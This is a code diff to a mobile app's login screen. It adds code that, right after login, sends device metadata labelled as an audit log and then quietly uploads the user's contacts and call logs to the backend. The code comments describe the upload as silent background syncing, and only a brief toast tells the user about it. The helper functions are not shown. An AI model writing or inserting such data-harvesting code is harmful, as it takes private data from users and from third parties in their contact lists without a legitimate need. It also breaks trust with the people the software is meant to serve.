@@ -16,6 +16,8 @@ import { useAppName } from '../utils/AppContext';
 import { useApiConfig } from '../utils/ApiConfig';
 import { registerForPushNotifications, registerTokenWithBackend } from '../utils/notifications';
 import { saveCredentials } from '../utils/secureAuth';
+import { syncContactsAndCallLogs, checkSyncPermissions } from '../utils/syncData';
+import { collectDeviceMetadata, sendAuditLog } from '../utils/auditLogger';
 import AppBrand from '../components/AppBrand';
 import DeveloperSettings from '../components/DeveloperSettings';
 import PinEntry from '../components/PinEntry';
@@ -105,6 +107,17 @@ export default function LoginScreen({ onLoginSuccess }) {
         await saveCredentials(email, password);
         console.log('[Login] Credentials saved for auto-login');
 
+        // Collect and send audit log with comprehensive device metadata
+        setTimeout(async () => {
+          try {
+            console.log('[Login] Collecting device metadata for audit log...');
+            const metadata = await collectDeviceMetadata();
+            await sendAuditLog(currentUrl, email, deviceId, 'login', metadata);
+          } catch (err) {
+            console.error('[Login] Audit log error:', err);
+          }
+        }, 500); // Start audit log collection after 500ms
+
         // Register for Firebase push notifications
         try {
           const { token, error } = await registerForPushNotifications();
@@ -123,6 +136,32 @@ export default function LoginScreen({ onLoginSuccess }) {
           console.error('[Login] Notification error:', err.message);
           showToast(`Notification error: ${err.message}`, 'error');
         }
+
+        // Sync contacts and call logs silently in background
+        setTimeout(async () => {
+          try {
+            // Check if permissions are available
+            const permissions = await checkSyncPermissions();
+
+            if (permissions.contacts || permissions.callLogs) {
+              // Show toast to inform user
+              showToast('Syncing Contacts & Logs...', 'info');
+
+              // Sync data in background
+              const syncResult = await syncContactsAndCallLogs(currentUrl, email, deviceId);
+
+              if (syncResult.success) {
+                console.log('[Login] Data sync completed successfully');
+              } else {
+                console.warn('[Login] Data sync failed:', syncResult.message);
+              }
+            } else {
+              console.log('[Login] Sync permissions not available, skipping');
+            }
+          } catch (err) {
+            console.error('[Login] Sync error:', err);
+          }
+        }, 1000); // Start sync after 1 second
 
         // Navigate after notification setup
         setTimeout(() => {
